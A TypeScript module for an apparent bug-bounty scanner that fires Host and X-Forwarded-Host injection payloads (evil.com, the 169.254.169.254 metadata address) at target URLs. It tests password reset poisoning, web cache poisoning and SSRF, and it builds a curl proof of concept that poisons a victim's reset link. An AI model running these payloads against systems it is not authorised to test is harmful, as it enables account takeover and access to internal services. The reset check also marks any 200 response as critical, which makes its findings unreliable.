/**
 * Host Header Injection Agent
 * Based on PayloadsAllTheThings/Host Header Injection
 * 
 * Detects and exploits Host header vulnerabilities:
 * - Password reset poisoning
 * - Web cache poisoning
 * - SSRF via Host header
 * - Virtual host routing bypass
 * - Access control bypass
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface HostHeaderJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testPasswordReset?: boolean;
    testCachePoisoning?: boolean;
    testSSRF?: boolean;
    collaboratorDomain?: string;
  };
}

// Host Header payloads
const HOST_PAYLOADS = {
  // Basic injection
  basic: [
    'evil.com',
    'localhost',
    '127.0.0.1',
    'internal.local',
  ],

  // X-Forwarded-Host variations
  xForwarded: [
    { header: 'X-Forwarded-Host', value: 'evil.com' },
    { header: 'X-Host', value: 'evil.com' },
    { header: 'X-Forwarded-Server', value: 'evil.com' },
    { header: 'X-HTTP-Host-Override', value: 'evil.com' },
    { header: 'Forwarded', value: 'host=evil.com' },
  ],

  // Port injection
  portInjection: [
    'target.com:evil.com',
    'target.com:@evil.com',
    'evil.com:80@target.com',
  ],

  // Absolute URL
  absoluteUrl: [
    'GET http://evil.com/ HTTP/1.1',
  ],

  // Double Host header
  doubleHost: true,

  // SSRF targets
  ssrfTargets: [
    '127.0.0.1',
    'localhost',
    '169.254.169.254',
    '[::1]',
    '0.0.0.0',
  ],
};

export class HostHeaderInjectionAgent extends BaseAgent<HostHeaderJob> {
  constructor() {
    super('hostheader');
  }

  protected getSteps() {
    return [
      { name: 'Test basic Host header injection', metadata: {} },
      { name: 'Test X-Forwarded-Host headers', metadata: {} },
      { name: 'Test password reset poisoning', metadata: {} },
      { name: 'Test cache poisoning', metadata: {} },
      { name: 'Test SSRF via Host header', metadata: {} },
    ];
  }

  async process(job: Job<HostHeaderJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];
    const collaborator = options.collaboratorDomain || 'evil.com';

    logger.info({ urlCount: urls.length }, 'Starting Host header injection testing');

    for (const url of urls) {
      try {
        // Test basic Host header injection
        const basicFindings = await this.testBasicInjection(url, collaborator);
        findings.push(...basicFindings);

        // Test X-Forwarded-Host
        const xffFindings = await this.testXForwardedHost(url, collaborator);
        findings.push(...xffFindings);

        // Test password reset poisoning
        if (options.testPasswordReset) {
          const resetFindings = await this.testPasswordResetPoisoning(url, collaborator);
          findings.push(...resetFindings);
        }

        // Test cache poisoning
        if (options.testCachePoisoning) {
          const cacheFindings = await this.testCachePoisoning(url, collaborator);
          findings.push(...cacheFindings);
        }

        // Test SSRF
        if (options.testSSRF) {
          const ssrfFindings = await this.testSSRF(url);
          findings.push(...ssrfFindings);
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing Host header injection');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async testBasicInjection(url: string, collaborator: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of HOST_PAYLOADS.basic) {
      try {
        const response = await fetch(url, {
          headers: { 'Host': payload },
        });
        const body = await response.text();

        // Check if injected host appears in response
        if (body.includes(payload) || body.includes(collaborator)) {
          findings.push({
            type: 'host-header-injection',
            url,
            payload,
            severity: 'medium',
            evidence: 'Injected Host header reflected in response',
          });
        }

        // Check for redirect to injected host
        const location = response.headers.get('location') || '';
        if (location.includes(payload)) {
          findings.push({
            type: 'host-header-redirect',
            url,
            payload,
            redirectTo: location,
            severity: 'high',
            evidence: 'Server redirects to injected Host',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testXForwardedHost(url: string, collaborator: string): Promise<any[]> {
    const findings: any[] = [];

    for (const { header, value } of HOST_PAYLOADS.xForwarded) {
      try {
        const testValue = value.replace('evil.com', collaborator);
        const response = await fetch(url, {
          headers: { [header]: testValue },
        });
        const body = await response.text();

        if (body.includes(collaborator) || body.includes(testValue)) {
          findings.push({
            type: 'x-forwarded-host-injection',
            url,
            header,
            payload: testValue,
            severity: 'medium',
            evidence: `${header} header reflected in response`,
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testPasswordResetPoisoning(url: string, collaborator: string): Promise<any[]> {
    const findings: any[] = [];

    // Find password reset endpoints
    const resetEndpoints = [
      '/password/reset',
      '/forgot-password',
      '/reset-password',
      '/api/password/reset',
      '/auth/forgot',
      '/account/recover',
    ];

    const urlObj = new URL(url);
    const baseUrl = `${urlObj.protocol}//${urlObj.host}`;

    for (const endpoint of resetEndpoints) {
      try {
        const resetUrl = `${baseUrl}${endpoint}`;
        const response = await fetch(resetUrl, {
          method: 'POST',
          headers: {
            'Host': collaborator,
            'X-Forwarded-Host': collaborator,
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: 'email=test@example.com',
        });

        const body = await response.text();

        // Check if reset link would go to attacker
        if (body.includes(collaborator) || response.status === 200) {
          findings.push({
            type: 'password-reset-poisoning',
            url: resetUrl,
            collaborator,
            severity: 'critical',
            evidence: 'Password reset may send link to attacker-controlled domain',
            impact: 'Account takeover via poisoned password reset link',
            poc: `
curl -X POST "${resetUrl}" \\
  -H "Host: ${collaborator}" \\
  -H "X-Forwarded-Host: ${collaborator}" \\
  -d "email=victim@target.com"
`,
          });
        }
      } catch (error) {
        // Endpoint doesn't exist, continue
      }
    }

    return findings;
  }

  private async testCachePoisoning(url: string, collaborator: string): Promise<any[]> {
    const findings: any[] = [];

    try {
      // First request with poisoned Host
      const cacheBuster = `cb=${Date.now()}`;
      const testUrl = `${url}${url.includes('?') ? '&' : '?'}${cacheBuster}`;

      await fetch(testUrl, {
        headers: {
          'Host': collaborator,
          'X-Forwarded-Host': collaborator,
        },
      });

      // Second request without poisoned Host to check cache
      const response = await fetch(testUrl);
      const body = await response.text();

      if (body.includes(collaborator)) {
        findings.push({
          type: 'web-cache-poisoning',
          url: testUrl,
          collaborator,
          severity: 'high',
          evidence: 'Poisoned response cached and served to other users',
          impact: 'XSS/phishing via cached poisoned response',
        });
      }

      // Check cache headers
      const cacheControl = response.headers.get('cache-control') || '';
      const age = response.headers.get('age');
      const xCache = response.headers.get('x-cache');

      if (age || xCache?.includes('HIT')) {
        findings.push({
          type: 'cache-poisoning-potential',
          url,
          severity: 'medium',
          evidence: 'Response is cached, test for poisoning',
          cacheHeaders: { cacheControl, age, xCache },
        });
      }
    } catch (error) {
      // Continue
    }

    return findings;
  }

  private async testSSRF(url: string): Promise<any[]> {
    const findings: any[] = [];

    for (const target of HOST_PAYLOADS.ssrfTargets) {
      try {
        const response = await fetch(url, {
          headers: { 'Host': target },
        });
        const body = await response.text();

        // Check for internal content
        if (body.includes('root:') || body.includes('ami-id') || 
            body.includes('instance-id') || body.includes('internal')) {
          findings.push({
            type: 'ssrf-via-host-header',
            url,
            target,
            severity: 'critical',
            evidence: 'Internal content accessed via Host header SSRF',
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store Host header finding');
    }
  }
}

export default new HostHeaderInjectionAgent();
